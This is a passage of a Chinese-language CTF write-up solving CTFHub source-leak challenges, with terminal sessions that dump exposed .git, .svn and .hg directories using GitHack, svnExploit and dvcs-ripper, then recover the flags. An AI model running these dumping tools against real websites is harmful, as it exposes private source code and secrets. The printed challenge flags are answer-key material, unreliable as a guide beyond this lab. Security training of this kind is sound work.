commit 2af4c55fd7a6e64762c583aa9e751b4048797cce (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:25:25 2023 +0000

    remove flag

commit da610ebc4966063d73e2b6803ac14eb733d0fd13
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:25:25 2023 +0000

    add flag

commit 3d7e73de132599e19f299844b23d115766c6bcc8
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:25:25 2023 +0000

    init

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ git diff da610ebc4966063d73e2b6803ac14eb733d0fd13
diff --git a/292222691319712.txt b/292222691319712.txt
deleted file mode 100644
index e358b09..0000000
--- a/292222691319712.txt
+++ /dev/null
@@ -1 +0,0 @@
-where is flag

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ git stash pop                                    
冲突（修改/删除）：292222691319712.txt 在 Updated upstream 中被删除，在 Stashed changes 中被修改。292222691319712.txt 的 Stashed changes 版本在树中被保留。
位于分支 master
未合并的路径：
  （使用 "git restore --staged <文件>..." 以取消暂存）
  （酌情使用 "git add/rm <文件>..." 标记解决方案）
        由我们删除： 292222691319712.txt

修改尚未加入提交（使用 "git add" 和/或 "git commit -a"）
贮藏条目被保留以备您再次需要。
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-053bfbe9e957dbd0.sandbox.ctfhub.com_10800]
└─$ cat 292222691319712.txt                                    
ctfhub{7784261fb20081dfe2abe94a}
```

提交`ctfhub{7784261fb20081dfe2abe94a}`即可。

------

##### Index

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

同理。

```bash
┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                             
 / ___(_) |_| | | | __ _  ___| | __                                         
| |  _| | __| |_| |/ _` |/ __| |/ /                                         
| |_| | | |_|  _  | (_| | (__|   <                                          
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                  
 A '.git' folder disclosure exploit.                                        
                                                                            
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git/                                                                        
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                   
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                              
提示：配置使用初始分支名，并消除这条警告，请执行：                          
提示：                                                                      
提示：  git config --global init.defaultBranch <名称>                       
提示：                                                                      
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development' 。                                                                          
提示：可以通过以下命令重命名刚创建的分支：                                  
提示：                                                                      
提示：  git branch -m <name>                                                
                                                                            
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/a2/77f03d557f6db4cb7b3ba18d1630a642165514
[*] objects/4d/ac90173ca05f0d4a8d2c9ce8327c4bb84869f3
[*] objects/7b/7e1784dc889629a748a96502b6d8b290f8f755
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/f7/0a136fe74a3578278b8b83a21f172f2a7b57c3
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ git log
commit a277f03d557f6db4cb7b3ba18d1630a642165514 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:35:08 2023 +0000

    add flag

commit 7b7e1784dc889629a748a96502b6d8b290f8f755
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:35:08 2023 +0000

    init

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ git diff a277f03d557f6db4cb7b3ba18d1630a642165514
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ ls
295351179921241.txt  50x.html  index.html
                                                                            
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-6a100cccfc1f7ec2.sandbox.ctfhub.com_10800]
└─$ cat 295351179921241.txt                                    
ctfhub{db36e890d8ae9388e2d950c5}
```

提交`ctfhub{db36e890d8ae9388e2d950c5}`即可。

#### SVN泄露

使用 [svnExploit](https://github.com/admintony/svnExploit) 未果。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/admintony/svnExploit.git

┌──(tyd㉿Kali)-[~/ctf]
└─$ cd svnExploit

┌──(tyd㉿Kali)-[~/ctf/svnExploit]
└─$ python SvnExploit.py -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
 ____             _____            _       _ _   
/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_ 
\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_ 
|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                            |_|                 
SvnExploit - Dump the source code by svn
Author: AdminTony (http://admintony.com)
https://github.com/admintony/svnExploit


+--------------------+----------+------------------------------------------------+
|       文件名       | 文件类型 |                    CheckSum                    |
+--------------------+----------+------------------------------------------------+
|     index.html     |   file   | $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92 |
| flag_116206259.txt |   file   |                      None                      |
+--------------------+----------+------------------------------------------------+
```

换个工具 [dvcs-ripper](https://github.com/kost/dvcs-ripper) 试试。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/kost/dvcs-ripper.git 

┌──(tyd㉿Kali)-[~/ctf]
└─$ sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ls
hg-decode.pl  README.md   rip-cvs.pl  rip-hg.pl
LICENSE       rip-bzr.pl  rip-git.pl  rip-svn.pl
                                                                           
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ./rip-svn.pl -v -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
[i] Found new SVN client storage format!
REP INFO => 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33   
[i] Trying to revert the tree, if you get error, upgrade your SVN client!   
已恢复“index.html”                                                          
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ls
hg-decode.pl  LICENSE    rip-bzr.pl  rip-git.pl  rip-svn.pl
index.html    README.md  rip-cvs.pl  rip-hg.pl
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ls -la                                  
总计 104
drwxr-xr-x 4 tyd tyd  4096  7月23日 18:03 .
drwxr-xr-x 6 tyd tyd  4096  7月23日 18:02 ..
drwxr-xr-x 8 tyd tyd  4096  7月23日 17:57 .git
-rw-r--r-- 1 tyd tyd   149  7月23日 17:57 .gitignore
-rw-r--r-- 1 tyd tyd  3855  7月23日 17:57 hg-decode.pl
-rw-r--r-- 1 tyd tyd   221  7月23日 18:03 index.html
-rw-r--r-- 1 tyd tyd 18027  7月23日 17:57 LICENSE
-rw-r--r-- 1 tyd tyd  5597  7月23日 17:57 README.md
-rwxr-xr-x 1 tyd tyd  6401  7月23日 17:57 rip-bzr.pl
-rwxr-xr-x 1 tyd tyd  4717  7月23日 17:57 rip-cvs.pl
-rwxr-xr-x 1 tyd tyd 15114  7月23日 17:57 rip-git.pl
-rwxr-xr-x 1 tyd tyd  6102  7月23日 17:57 rip-hg.pl
-rwxr-xr-x 1 tyd tyd  6157  7月23日 17:57 rip-svn.pl
drwxr-xr-x 5 tyd tyd  4096  7月23日 18:03 .svn

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ cd .svn   

# 用curl命令访问文件检查网页中是否存在flag返回404
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
└─$ curl http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/flag_116206259.txt
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>

┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
└─$ ls
entries  format  pristine  text-base  tmp  wc.db  wc.db-journal
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
└─$ cd pristine
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
└─$ ls
88  bf
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
└─$ cd 88      
                                                                            
┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
└─$ ls
88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
                                                                            
┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
└─$ cat 88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
ctfhub{e99d45499cf367688c931aa2}
```

提交`ctfhub{e99d45499cf367688c931aa2}`即可。

------

#### HG泄露

```bash
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ ./rip-hg.pl -u http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/.hg
[i] Getting correct 404 responses
[i] Finished (2 of 12)
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ tree .hg
.hg
├── 00changelog.i
├── dirstate
├── last-message.txt
├── requires
├── store
│   ├── 00changelog.i
│   ├── 00manifest.i
│   ├── data
│   ├── fncache
│   └── undo
├── undo.branch
├── undo.desc
└── undo.dirstate

3 directories, 11 files
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ cat .hg/last-message.txt                             
add flag                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ grep -a -r flag                                  
.git/hooks/fsmonitor-watchman.sample:           # return the fast "everything is dirty" flag to git and do the
�O��L▒c.!flag_11i206259.index.htmlindex.htmlnormalfile$sha1$bf45c36a4dfb7337normaldir()infinity��å~%���Á�root�$�8�@3▒
.svn/wc.db:�����2▒      flag_116206259.txt      index.html
index.html6259.txt
hg-decode.pl:      ( $head->{'flags'},
.hg/last-message.txt:add flag
.hg/dirstate:index.htmln��!d���flag_393953.txt
.hg/store/00manifest.i:Yf��������H�tw������m'�Ȉ�*x�-�1�@�>�@)-<�▒M������x�1<�v�Ǣ�2K){�Z3�s�&ӱf▒A����?6[�B�
                              6Ta�(��1$�Ü*YE������<W��ĩ���jV��⸉�8229flag_393953.txt7870e1473e78ed89644b65acab26c0f3e213f7a8
.hg/store/undo:data/flag_393953.txt.i0
.hg/store/fncache:data/flag_393953.txt.i
.hg/undo.dirstate:index.htmla��������flag_393953.txt
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ curl http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/flag_116206259.txt
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.16.1</center>
</body>
</html>
                                                                            
┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
└─$ curl http://challenge-e37705d9e5375944.sandbox.ctfhub.com:10800/flag_393953.txt
ctfhub{f90b6c76f97124cd83e38e9b}
```

提交`ctfhub{f90b6c76f97124cd83e38e9b}`即可。

------

